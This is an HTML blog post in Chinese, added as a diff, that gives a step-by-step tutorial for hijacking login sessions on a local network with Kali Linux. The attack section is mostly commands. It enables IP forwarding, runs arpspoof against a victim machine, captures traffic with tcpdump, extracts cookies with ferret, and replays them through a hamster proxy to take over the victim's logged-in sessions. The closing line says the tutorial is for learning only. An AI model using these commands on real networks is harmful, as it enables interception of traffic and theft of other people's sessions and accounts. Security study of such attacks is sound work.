@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>kali利用Arpspoof、tcpdump、ferret和hamster劫持登录会话 | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="kali,渗透测试," />
+  
+
+  <meta name="description" content="上篇博客讲解了ARP欺骗的原理http://huirong.github.io/2015/03/25/arp/，不懂的可以自行google，网上有很多教程。这次讲解利用ARP欺骗劫持登录会话">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali利用Arpspoof、tcpdump、ferret和hamster劫持登录会话">
+<meta property="og:url" content="http://huirong.github.io/2015/03/25/arpspoof/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="上篇博客讲解了ARP欺骗的原理http://huirong.github.io/2015/03/25/arp/，不懂的可以自行google，网上有很多教程。这次讲解利用ARP欺骗劫持登录会话">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3adliqnj30ki0duwi5.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1eqi2xbwlwwj30kf0dq75p.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCjw1eqi2yqbc8mj30f40iadhm.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCjw1eqi2z18sdfj311x0dqtch.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3096wd6j30m807sdi2.jpg">
+<meta property="og:updated_time" content="2016-04-16T09:07:33.419Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="kali利用Arpspoof、tcpdump、ferret和hamster劫持登录会话">
+<meta name="twitter:description" content="上篇博客讲解了ARP欺骗的原理http://huirong.github.io/2015/03/25/arp/，不懂的可以自行google，网上有很多教程。这次讲解利用ARP欺骗劫持登录会话">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3adliqnj30ki0duwi5.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、环境"><span class="toc-text">I、环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-拓扑环境"><span class="toc-text">① 拓扑环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-安装ferret"><span class="toc-text">② 安装ferret</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、开始攻击"><span class="toc-text">II、开始攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-打开路由转发"><span class="toc-text">① 打开路由转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-ARP欺骗"><span class="toc-text">② ARP欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-抓取本地数据包"><span class="toc-text">③ 抓取本地数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#④-耐心等待。。。"><span class="toc-text">④ 耐心等待。。。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#⑤-使用ferret分析抓取的数据包"><span class="toc-text">⑤ 使用ferret分析抓取的数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#⑥-hamster架设代理，登录会话"><span class="toc-text">⑥ hamster架设代理，登录会话</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、参考文献"><span class="toc-text">III、参考文献</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-arpspoof" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">kali利用Arpspoof、tcpdump、ferret和hamster劫持登录会话</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2015.03.25</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2015/03/25/arpspoof/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>上篇博客讲解了ARP欺骗的原理<a href="http://huirong.github.io/2015/03/25/arp/">http://huirong.github.io/2015/03/25/arp/</a>，不懂的可以自行google，网上有很多教程。<br>这次讲解利用ARP欺骗劫持登录会话<br><a id="more"></a></p>
+<h1 id="I、环境"><a href="#I、环境" class="headerlink" title="I、环境"></a>I、环境</h1><h2 id="①-拓扑环境"><a href="#①-拓扑环境" class="headerlink" title="① 拓扑环境"></a>① 拓扑环境</h2><ul>
+<li>攻击机：Kali Linux IP：192.168.1.118</li>
+<li>受害机：Win7   IP：192.168.1.131</li>
+<li>网关IP：192.168.1.1</li>
+<li>攻击工具：arpspoof、tcpdump、ferret、hamster<br>前三款工具已经集成在Kali中了，ferret需要手动安装<h2 id="②-安装ferret"><a href="#②-安装ferret" class="headerlink" title="② 安装ferret"></a>② 安装ferret</h2>首先kali 64bit默认不安装ferret，需要自己解决。我之前是apt-get install ferret安装的，执行后会弹出一个对话框，也无法生成hamster.txt，费解多时，因为此ferret非我们需要的ferret。</li>
+</ul>
+<ol>
+<li><p>修改source.list中的内容，如下所示：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">## Regular repositories</span></div><div class="line">deb <span class="keyword">http</span>://<span class="keyword">http</span>.kali.org/kali kali main non-free contrib</div><div class="line">deb <span class="keyword">http</span>://security.kali.org/kali-security kali/updates main contrib non-free</div><div class="line"><span class="comment">## Source repositories</span></div><div class="line">deb-src <span class="keyword">http</span>://<span class="keyword">http</span>.kali.org/kali kali main non-free contrib</div><div class="line">deb-src <span class="keyword">http</span>://security.kali.org/kali-security kali/updates main contrib non-free</div></pre></td></tr></table></figure>
+</li>
+<li><p>添加对32为的支持</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dpkg <span class="comment">--add-architecture i386</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>更新</p>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-<span class="built_in">get</span> clean &amp;&amp; apt-<span class="built_in">get</span> update &amp;&amp; apt-<span class="built_in">get</span> upgrade -y &amp;&amp; apt-<span class="built_in">get</span> <span class="built_in">dist</span>-upgrade -y</div></pre></td></tr></table></figure>
+</li>
+<li><p>先删除原来的ferret</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aptitude <span class="built_in">remove</span> ferret</div></pre></td></tr></table></figure>
+</li>
+<li><p>安装我们需要的feret</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aptitude <span class="keyword">install</span> ferret-sidejack:i386</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="II、开始攻击"><a href="#II、开始攻击" class="headerlink" title="II、开始攻击"></a>II、开始攻击</h1><h2 id="①-打开路由转发"><a href="#①-打开路由转发" class="headerlink" title="① 打开路由转发"></a>① 打开路由转发</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo <span class="string">"1"</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/ip_forward</span></div></pre></td></tr></table></figure>
+<p>linux下开启路由转发功能，可以让linux机器作为一个路由器来工作，将受害主机的数据包发送给网关。如果不开启此功能，受害主机的将会断网，这就是ARP断网攻击。<br>系统重启后，恢复原来的配置，只是临时生效</p>
+<h2 id="②-ARP欺骗"><a href="#②-ARP欺骗" class="headerlink" title="② ARP欺骗"></a>② ARP欺骗</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> <span class="selector-tag">wlan0</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.131</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.1</span></div></pre></td></tr></table></figure>
+<p>欺骗受害主机192.168.1.131，网关192.168.1.1的MAC地址是攻击机的MAC地址，那么在局域网内，受害主机发送给网关的数据包，都会发送给攻击机<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3adliqnj30ki0duwi5.jpg" alt=""></p>
+<h2 id="③-抓取本地数据包"><a href="#③-抓取本地数据包" class="headerlink" title="③ 抓取本地数据包"></a>③ 抓取本地数据包</h2><p>重新打开一个终端，输入：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -<span class="selector-tag">i</span> wlan0 -w hello.cap</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCjw1eqi2xbwlwwj30kf0dq75p.jpg" alt=""><br>将抓取到的数据保存到hello.cap文件中</p>
+<h2 id="④-耐心等待。。。"><a href="#④-耐心等待。。。" class="headerlink" title="④ 耐心等待。。。"></a>④ 耐心等待。。。</h2><p>此时，需要等待受害主机登录摸个网站，或刷新已经登录过的页面<br>相当于受害在想网关发送携带了cookie的数据包，我们就是要劫持这个cookie<br>当刷新完毕后，就可以结束 arpspoof 和 tcpdump</p>
+<h2 id="⑤-使用ferret分析抓取的数据包"><a href="#⑤-使用ferret分析抓取的数据包" class="headerlink" title="⑤ 使用ferret分析抓取的数据包"></a>⑤ 使用ferret分析抓取的数据包</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ferret</span> <span class="selector-tag">-r</span> <span class="selector-tag">hello</span><span class="selector-class">.cap</span></div></pre></td></tr></table></figure>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg" alt=""><br>查看根目录，会发现自动生成了hamster.txt文件</p>
+<h2 id="⑥-hamster架设代理，登录会话"><a href="#⑥-hamster架设代理，登录会话" class="headerlink" title="⑥ hamster架设代理，登录会话"></a>⑥ hamster架设代理，登录会话</h2><p>在终端输入<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">hamster</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg" alt=""><br>设置浏览器代理<br><img src="http://ww1.sinaimg.cn/large/005CA6ZCjw1eqi2yqbc8mj30f40iadhm.jpg" alt=""><br>打开hamster<br><img src="http://ww2.sinaimg.cn/large/005CA6ZCjw1eqi2z18sdfj311x0dqtch.jpg" alt=""><br>点击192.168.1.131<br>左边就是获取的cookie信息，找到合适的，就可以看到受害者的登录信息<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3096wd6j30m807sdi2.jpg" alt=""></p>
+<p>OK，攻击完毕啦，本教程仅做学习用途<del>~</del>~~~~</p>
+<h1 id="III、参考文献"><a href="#III、参考文献" class="headerlink" title="III、参考文献"></a>III、参考文献</h1><p><a href="http://www.it165.net/safe/html/201501/1025.html" target="_blank" rel="external">局域网安全 利用ARP欺骗劫持Cookie</a><br><a href="http://yuangeqingtian.blog.51cto.com/6994701/1302773" target="_blank" rel="external">linux开启路由转发功能</a></p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2015/03/25/arpspoof/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2015/03/25/arpspoof/index.html" data-title="kali利用Arpspoof、tcpdump、ferret和hamster劫持登录会话" data-url="http://huirong.github.io/2015/03/25/arpspoof/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
